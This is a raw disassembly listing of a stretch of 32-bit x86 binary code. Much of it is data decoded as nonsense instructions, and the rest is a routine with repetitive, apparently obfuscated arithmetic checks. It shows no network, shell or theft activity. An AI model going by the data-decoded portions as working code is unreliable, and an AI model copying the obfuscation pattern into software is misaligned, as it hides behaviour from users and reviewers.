  41c6ae:	and    edi,ebp
  41c6b0:	out    dx,eax
  41c6b1:	imul   ebp,DWORD PTR [esi+edi*1+0x521119af],0xffffffca
  41c6b9:	pop    ebp
  41c6ba:	push   ds
  41c6bb:	lahf   
  41c6bc:	(bad)  
  41c6bd:	cmp    edi,edi
  41c6bf:	dec    eax
  41c6c0:	xchg   ebx,eax
  41c6c1:	pop    ebx
  41c6c2:	shl    DWORD PTR [esi],1
  41c6c4:	fstp   DWORD PTR [esi-0x3fc7e2a4]
  41c6ca:	call   0xb05f:0x6e8c205e
  41c6d1:	ffree  st(7)
  41c6d3:	mov    ecx,0x1751e3a4
  41c6d8:	inc    eax
  41c6d9:	sbb    ah,dl
  41c6db:	add    DWORD PTR [eax-0x32],ebx
  41c6de:	jns    0x41c73a
  41c6e0:	jns    0x41c760
  41c6e2:	sahf   
  41c6e3:	(bad)  
  41c6e4:	push   es
  41c6e5:	nop
  41c6e6:	ret    0xec58
  41c6e9:	add    BYTE PTR [ebx-0x4fcd9675],dh
  41c6ef:	mov    ch,BYTE PTR [esi+edx*4-0x48]
  41c6f3:	pop    ss
  41c6f4:	jg     0x41c75f
  41c6f6:	ds push cs
  41c6f8:	and    eax,eax
  41c6fa:	ss out dx,al
  41c6fc:	mov    dl,0xf4
  41c6fe:	cdq    
  41c6ff:	xchg   ebx,eax
  41c700:	mov    BYTE PTR [ebx+0x7f],bh
  41c703:	int3   
  41c704:	sbb    al,BYTE PTR [ebx+0x2e87154f]
  41c70a:	cs push es
  41c70c:	jnp    0x41c6c8
  41c70e:	inc    esi
  41c70f:	fisubr WORD PTR [esi]
  41c711:	add    al,0x8d
  41c713:	pop    edi
  41c714:	adc    ax,0x90a0
  41c718:	mov    bh,al
  41c71a:	xchg   ebp,edi
  41c71c:	push   ds
  41c71d:	and    bh,dh
  41c71f:	pop    es
  41c720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c721:	mov    ecx,0x644a7175
  41c726:	push   ecx
  41c727:	in     eax,dx
  41c728:	mov    ds:0x2d145148,eax
  41c72d:	pop    edi
  41c72e:	nop
  41c72f:	adc    dh,BYTE PTR [ecx+0x3f]
  41c732:	xchg   ecx,eax
  41c733:	cdq    
  41c734:	push   ebx
  41c735:	retf   0xa539
  41c738:	fld    QWORD PTR [edi-0x1b]
  41c73b:	hlt    
  41c73c:	scas   al,BYTE PTR es:[edi]
  41c73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c73e:	xor    eax,0xbf5c91e4
  41c743:	aam    0x3e
  41c745:	neg    BYTE PTR ds:0x88364b45
  41c74b:	mov    al,0xbe
  41c74d:	mov    ebp,0x78b94e22
  41c752:	push   ds
  41c753:	call   0x7352e98d
  41c758:	add    eax,0x26056631
  41c75d:	ret    0xc375
  41c760:	mov    esp,0x7d124114
  41c765:	pop    eax
  41c766:	pop    edi
  41c767:	add    bh,BYTE PTR [eax-0x32fbed00]
  41c76d:	test   DWORD PTR [ebx],ebx
  41c76f:	(bad)  
  41c770:	ds ins DWORD PTR es:[edi],dx
  41c772:	nop
  41c773:	and    BYTE PTR [eax-0x5a],0x10
  41c777:	xchg   edx,eax
  41c778:	add    al,0x90
  41c77a:	sub    DWORD PTR [ebp-0x24],0x15eb77c
  41c781:	test   eax,0xce8d2d3b
  41c786:	loopne 0x41c722
  41c788:	xor    BYTE PTR [edx-0x51],0x4d
  41c78c:	sub    ebx,esp
  41c78e:	pusha  
  41c78f:	pop    ss
  41c790:	mov    esi,0xdc54300d
  41c795:	lock inc ebx
  41c797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c798:	iret   
  41c799:	lods   al,BYTE PTR ds:[esi]
  41c79a:	or     edi,DWORD PTR [edi+0x55fc2e50]
  41c7a0:	pop    edi
  41c7a1:	test   al,dh
  41c7a3:	dec    edi
  41c7a4:	mov    eax,0xf6dc2b2c
  41c7a9:	mov    dh,0x40
  41c7ab:	hlt    
  41c7ac:	mov    cl,0xbe
  41c7ae:	dec    ebx
  41c7af:	mov    bl,0x22
  41c7b1:	in     eax,0xeb
  41c7b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7b4:	lea    edx,[ebx]
  41c7b6:	(bad)  
  41c7b7:	cmp    BYTE PTR [ebp+0x4ba7b88c],dl
  41c7bd:	sbb    DWORD PTR [eax+0x1],ecx
  41c7c0:	repz sbb bh,dh
  41c7c3:	addr16 sti 
  41c7c5:	stos   BYTE PTR es:[edi],al
  41c7c6:	and    bl,cl
  41c7c8:	sbb    DWORD PTR [ecx+esi*8+0x77],edi
  41c7cc:	loop   0x41c7ad
  41c7ce:	jne    0x41c760
  41c7d0:	push   0x28
  41c7d2:	clc    
  41c7d3:	popa   
  41c7d4:	pop    eax
  41c7d5:	es stos DWORD PTR es:[edi],eax
  41c7d7:	out    0x9d,eax
  41c7d9:	jnp    0x41c7a2
  41c7db:	jb     0x41c80b
  41c7dd:	mov    dl,0x7
  41c7df:	dec    ebx
  41c7e0:	outs   dx,BYTE PTR ds:[esi]
  41c7e1:	add    esi,DWORD PTR [edi+0x164f658d]
  41c7e7:	(bad)  [eax]
  41c7e9:	sbb    edi,DWORD PTR [edx+0x20]
  41c7ec:	jo     0x41c7ea
  41c7ee:	fidivr DWORD PTR [edx-0x16b49041]
  41c7f4:	cmp    al,0x24
  41c7f6:	adc    BYTE PTR [edx-0x61940cf4],al
  41c7fc:	lock mov eax,ds:0xd84d4304
  41c802:	dec    edx
  41c803:	pop    ss
  41c804:	aaa    
  41c805:	cmp    eax,0x18edd308
  41c80a:	push   edx
  41c80b:	mov    ah,0x46
  41c80d:	xlat   BYTE PTR ds:[ebx]
  41c80e:	outs   dx,DWORD PTR ds:[esi]
  41c80f:	aam    0x93
  41c811:	ins    BYTE PTR es:[edi],dx
  41c812:	sub    ebp,ebp
  41c814:	inc    esi
  41c815:	scas   al,BYTE PTR es:[edi]
  41c816:	fmul   DWORD PTR [edi+0x4562d739]
  41c81c:	cmc    
  41c81d:	add    eax,DWORD PTR [ecx]
  41c81f:	es jae 0x41c84b
  41c822:	push   0x59
  41c824:	xchg   BYTE PTR [esi+0x3e],dh
  41c827:	out    0x23,al
  41c829:	ss es sti 
  41c82c:	imul   ecx,DWORD PTR [ecx-0x166650ce],0x5d19d985
  41c836:	dec    esi
  41c837:	(bad)  
  41c838:	and    dl,ah
  41c83a:	sahf   
  41c83b:	shl    BYTE PTR [eax-0x51],cl
  41c83e:	dec    edx
  41c83f:	jns    0x41c809
  41c841:	xor    BYTE PTR [eax],0xbf
  41c844:	jle    0x41c8bb
  41c846:	popf   
  41c847:	sahf   
  41c848:	(bad)  
  41c849:	sub    DWORD PTR [eax-0x6f40c18f],0xc21af0f6
  41c853:	(bad)  ds:0x8e37b9b5
  41c859:	push   esi
  41c85a:	sub    BYTE PTR [esi+0x2fa46363],al
  41c860:	mov    bl,0xd3
  41c862:	enter  0x2438,0x88
  41c866:	mov    dh,0x61
  41c868:	and    dl,BYTE PTR [eax-0x17]
  41c86b:	retf   
  41c86c:	jns    0x41c8db
  41c86e:	addr16 js 0x41c821
  41c871:	mov    DWORD PTR [esi+0x3e],ebp
  41c874:	pop    edx
  41c875:	les    edi,FWORD PTR [ecx-0x39]
  41c878:	scas   eax,DWORD PTR es:[edi]
  41c879:	in     eax,0x8b
  41c87b:	and    eax,0xf9ab0a7a
  41c880:	ins    BYTE PTR es:[edi],dx
  41c881:	jo     0x41c84b
  41c883:	and    ch,BYTE PTR [ecx]
  41c885:	sbb    ch,bh
  41c887:	mov    ah,0xad
  41c889:	jecxz  0x41c906
  41c88b:	adc    al,BYTE PTR [edx+0x943e4bf]
  41c891:	and    ecx,DWORD PTR [eax]
  41c893:	(bad)  
  41c894:	mov    al,0x17
  41c896:	or     al,0xd8
  41c898:	ins    DWORD PTR es:[edi],dx
  41c899:	sbb    BYTE PTR [eax+0x8e733ed],ah
  41c89f:	aaa    
  41c8a0:	cmp    BYTE PTR [edi-0x3d92ce1c],bl
  41c8a6:	mov    edx,0x33b793ab
  41c8ab:	jmp    0xc0da:0x27af7f83
  41c8b2:	inc    esi
  41c8b3:	jmp    0x41c8e2
  41c8b5:	push   ebp
  41c8b6:	dec    edx
  41c8b7:	sbb    al,BYTE PTR [ecx]
  41c8b9:	push   eax
  41c8ba:	inc    edi
  41c8bb:	nop
  41c8bc:	mov    al,0x26
  41c8be:	lods   eax,DWORD PTR ds:[esi]
  41c8bf:	adc    esp,ebx
  41c8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8c2:	dec    edi
  41c8c3:	mov    edx,0xc550f8d2
  41c8c8:	sbb    esp,ebp
  41c8ca:	xchg   DWORD PTR [eax+0x42dc1270],eax
  41c8d0:	jle    0x41c892
  41c8d2:	add    al,0xdf
  41c8d4:	mov    ds:0xf86b7b84,al
  41c8d9:	or     BYTE PTR [edx-0x71],bl
  41c8dc:	leave  
  41c8dd:	add    DWORD PTR [esi+0xb],esp
  41c8e0:	stc    
  41c8e1:	ret    0xd80e
  41c8e4:	pop    ss
  41c8e5:	fsub   DWORD PTR [ebx-0xb]
  41c8e8:	jbe    0x41c930
  41c8ea:	cmp    eax,0xae152789
  41c8ef:	je     0x41c892
  41c8f1:	fist   WORD PTR [edx]
  41c8f3:	mov    al,BYTE PTR [edi-0x17]
  41c8f6:	sub    DWORD PTR [ecx],esp
  41c8f8:	push   es
  41c8f9:	sahf   
  41c8fa:	xchg   ecx,eax
  41c8fb:	sub    BYTE PTR [edi+0xa9725bb],bh
  41c901:	in     al,dx
  41c902:	pop    esi
  41c903:	js     0x41c8ea
  41c905:	cmp    eax,0xe26c7609
  41c90a:	jle    0x41c89a
  41c90c:	pop    ds
  41c90d:	call   0x202a1c4b
  41c912:	jmp    0x7d91:0x2fb45ca2
  41c919:	and    DWORD PTR [esp+edx*4-0x6],0x7a
  41c91e:	aam    0x2b
  41c920:	retf   
  41c921:	sbb    BYTE PTR [eax-0xd],cl
  41c924:	pop    ebx
  41c925:	popa   
  41c926:	adc    ah,bh
  41c928:	mov    bl,0x64
  41c92a:	lahf   
  41c92b:	dec    ebx
  41c92c:	jmp    0xdb89:0x8e82ea03
  41c933:	fistp  WORD PTR [eax]
  41c935:	aaa    
  41c936:	aaa    
  41c937:	loop   0x41c8e2
  41c939:	inc    ebx
  41c93a:	(bad)  
  41c93b:	dec    edi
  41c93c:	push   ecx
  41c93d:	shl    edi,cl
  41c93f:	jb     0x41c8ec
  41c941:	mov    eax,0x147af897
  41c946:	call   0xac5ba0fc
  41c94b:	test   eax,0x91d22efa
  41c950:	push   cs
  41c951:	in     al,0xfb
  41c953:	mov    esp,0xde882c71
  41c958:	dec    esp
  41c959:	mov    esi,DWORD PTR [eax-0x5e]
  41c95c:	cli    
  41c95d:	sbb    DWORD PTR ds:0xb73bd0f8,0x8e740837
  41c967:	adc    DWORD PTR ds:[esi+0x28],eax
  41c96b:	mov    edx,0x2c16ffa8
  41c970:	dec    ebp
  41c971:	(bad)  
  41c973:	popf   
  41c974:	jl     0x41c90b
  41c976:	(bad)  [edx+0x687347b8]
  41c97c:	push   cs
  41c97d:	xchg   esp,eax
  41c97e:	repz aaa 
  41c980:	inc    esp
  41c981:	dec    esi
  41c982:	outs   dx,BYTE PTR ds:[esi]
  41c983:	call   0xaea8e298
  41c988:	mov    ds:0xc4089eb0,al
  41c98d:	mov    ebp,0x3203c150
  41c992:	repnz mov edx,0x2e420177
  41c998:	outs   dx,BYTE PTR ds:[esi]
  41c999:	push   ebx
  41c99a:	jns    0x41c93b
  41c99c:	int3   
  41c99d:	sub    al,0x83
  41c99f:	fbld   TBYTE PTR [eax+0x71]
  41c9a2:	retf   0x96c0
  41c9a5:	xchg   esi,eax
  41c9a6:	xchg   esp,eax
  41c9a7:	adc    eax,0x78b28ca9
  41c9ac:	jbe    0x41c9e2
  41c9ae:	out    dx,al
  41c9af:	inc    ecx
  41c9b0:	lahf   
  41c9b1:	test   DWORD PTR [esi],esi
  41c9b3:	enter  0x1c34,0x86
  41c9b7:	cmp    al,BYTE PTR [ebp+0x7d]
  41c9ba:	push   0xf8205acb
  41c9bf:	and    eax,0x36293cf1
  41c9c4:	mov    esi,0xd6fa1fc2
  41c9c9:	pop    eax
  41c9ca:	push   cs
  41c9cb:	and    BYTE PTR [edi-0x7651e476],bh
  41c9d1:	mov    al,ds:0xdcf645b4
  41c9d6:	inc    ecx
  41c9d7:	sbb    al,0xc9
  41c9d9:	adc    BYTE PTR [ebx],ch
  41c9db:	adc    esi,DWORD PTR [edi+0x71]
  41c9de:	mov    esp,0x506f08b
  41c9e3:	mov    ch,0xb4
  41c9e5:	cld    
  41c9e6:	mov    cl,0xe7
  41c9e8:	in     eax,0x62
  41c9ea:	int    0x24
  41c9ec:	rcl    BYTE PTR [ebp-0x78],cl
  41c9ef:	sbb    al,0x14
  41c9f1:	(bad)  
  41c9f2:	jbe    0x41c98d
  41c9f4:	push   ebx
  41c9f5:	mov    ebp,0xccfcb282
  41c9fa:	mov    esp,0x66cdbaa0
  41c9ff:	js     0x41c9da
  41ca01:	jl     0x41ca6b
  41ca03:	add    esi,DWORD PTR [ebp-0x56149cf7]
  41ca09:	pop    esp
  41ca0a:	add    DWORD PTR [ecx-0x12],esp
  41ca0d:	mov    al,ds:0xadcc455a
  41ca12:	dec    eax
  41ca13:	mov    ds:0xeec6c0e1,eax
  41ca18:	ret    
  41ca19:	fwait
  41ca1a:	aas    
  41ca1b:	loope  0x41ca3b
  41ca1d:	push   edx
  41ca1e:	sbb    eax,0x63656474
  41ca23:	stos   BYTE PTR es:[edi],al
  41ca24:	imul   DWORD PTR [esi-0xd0fb6a9]
  41ca2a:	cli    
  41ca2b:	mov    ebp,0x3fdff9a5
  41ca30:	or     WORD PTR [edi+0x1e2de1e1],ax
  41ca37:	fld    DWORD PTR [edx+edi*4+0x4c]
  41ca3b:	lsl    ebx,WORD PTR [edx-0x69]
  41ca3f:	and    DWORD PTR ds:0xeeb9c694,edx
  41ca45:	mov    esi,0xcd9fc7
  41ca4a:	add    al,BYTE PTR [eax+0x12]
  41ca4d:	jae    0x41ca82
  41ca4f:	adc    al,0x6
  41ca51:	mov    al,dh
  41ca53:	jp     0x41ca50
  41ca55:	xchg   BYTE PTR [esp+edx*1+0x59],al
  41ca59:	mov    ecx,0x6cb6ae64
  41ca5e:	in     al,dx
  41ca5f:	adc    eax,0xe61b93ba
  41ca64:	xor    eax,0xf2bbae2a
  41ca69:	loopne 0x41ca9c
  41ca6b:	adc    eax,0x71fea000
  41ca70:	mov    edi,0x723a8b9
  41ca75:	lods   eax,DWORD PTR ds:[esi]
  41ca76:	fsubr  st(5),st
  41ca78:	jmp    0xd4e33276
  41ca7d:	mov    cs,WORD PTR [eax]
  41ca7f:	lock cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41ca82:	ret    0xe868
  41ca85:	xor    ebp,DWORD PTR ss:[ebp+0x3b]
  41ca89:	inc    esi
  41ca8a:	ror    esp,0xe8
  41ca8d:	push   esi
  41ca8e:	pushf  
  41ca8f:	cmc    
  41ca90:	push   eax
  41ca91:	idiv   BYTE PTR [eax+0x60]
  41ca94:	mov    ds:0xe87f95cc,eax
  41ca99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca9a:	stos   DWORD PTR es:[edi],eax
  41ca9b:	push   esp
  41ca9c:	nop
  41ca9d:	aas    
  41ca9e:	pop    ss
  41ca9f:	adc    BYTE PTR [ebp-0x20],al
  41caa2:	aam    0x40
  41caa4:	ins    BYTE PTR es:[edi],dx
  41caa5:	cmp    eax,0xd84a668c
  41caaa:	ins    DWORD PTR es:[edi],dx
  41caab:	clc    
  41caac:	mov    dl,0xf
  41caae:	daa    
  41caaf:	sub    eax,0x815f67c2
  41cab4:	cld    
  41cab5:	ds call 0x7e18f6cc
  41cabb:	gs jmp 0xba22e3a8
  41cac1:	pop    ebp
  41cac2:	inc    ebx
  41cac3:	ins    DWORD PTR es:[edi],dx
  41cac4:	push   0x30baa211
  41cac9:	xchg   ebx,eax
  41caca:	enter  0x852d,0xb8
  41cace:	mov    ecx,0x9c1d7c9f
  41cad3:	jp     0x41ca68
  41cad5:	push   eax
  41cad6:	dec    edx
  41cad7:	cmp    al,0x2d
  41cad9:	xchg   ebp,ebp
  41cadb:	popa   
  41cadc:	retf   0x57d5
  41cadf:	call   esi
  41cae1:	sbb    ebx,esi
  41cae3:	jns    0x41cb47
  41cae5:	les    esp,FWORD PTR [esi+0x4e4c6b0d]
  41caeb:	bound  edi,QWORD PTR [eax]
  41caed:	lahf   
  41caee:	neg    DWORD PTR [esi]
  41caf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf1:	cmp    al,BYTE PTR [ebx+0xdeb3f75]
  41caf7:	(bad)  
  41caf8:	loop   0x41cb0a
  41cafa:	adc    al,ch
  41cafc:	leave  
  41cafd:	inc    ebp
  41cafe:	cld    
  41caff:	add    BYTE PTR [ecx+0x13],dh
  41cb02:	xchg   esi,eax
  41cb03:	inc    edi
  41cb04:	or     ecx,DWORD PTR [ecx-0xc]
  41cb07:	test   bh,ah
  41cb09:	mov    dh,0x35
  41cb0b:	sbb    al,0xaf
  41cb0d:	add    eax,0x3045c457
  41cb12:	add    eax,0x9eeb32f3
  41cb17:	loop   0x41cb42
  41cb19:	test   al,0x1a
  41cb1b:	rcr    DWORD PTR gs:[ecx+0x12],1
  41cb1f:	adc    eax,DWORD PTR [edx]
  41cb21:	jl     0x41cb14
  41cb23:	mov    ds:0x3ee33a49,eax
  41cb28:	test   BYTE PTR [esi+0x66],ah
  41cb2b:	xor    ch,ch
  41cb2d:	dec    edi
  41cb2e:	push   ebp
  41cb2f:	or     eax,0x3051ccd
  41cb34:	xchg   edi,eax
  41cb35:	mov    esi,0xc404ea4
  41cb3a:	gs sti 
  41cb3c:	push   ecx
  41cb3d:	cmp    esi,DWORD PTR [ecx-0x6d0eac2f]
  41cb43:	out    dx,al
  41cb44:	xor    esi,DWORD PTR [ecx-0x6d]
  41cb47:	xor    ebx,DWORD PTR [ecx]
  41cb49:	dec    edi
  41cb4a:	mov    fs,WORD PTR [eax]
  41cb4c:	jnp    0x41cb7e
  41cb4e:	stos   DWORD PTR es:[edi],eax
  41cb4f:	hlt    
  41cb50:	sbb    DWORD PTR [edi+0x61],0xffffffdb
  41cb54:	mov    ebp,0xe2d7e9cb
  41cb59:	scas   eax,DWORD PTR es:[edi]
  41cb5a:	sbb    dl,BYTE PTR [edi+esi*8]
  41cb5d:	push   ebx
  41cb5e:	cmc    
  41cb5f:	jge    0x41cb27
  41cb61:	cli    
  41cb62:	and    edx,ebx
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
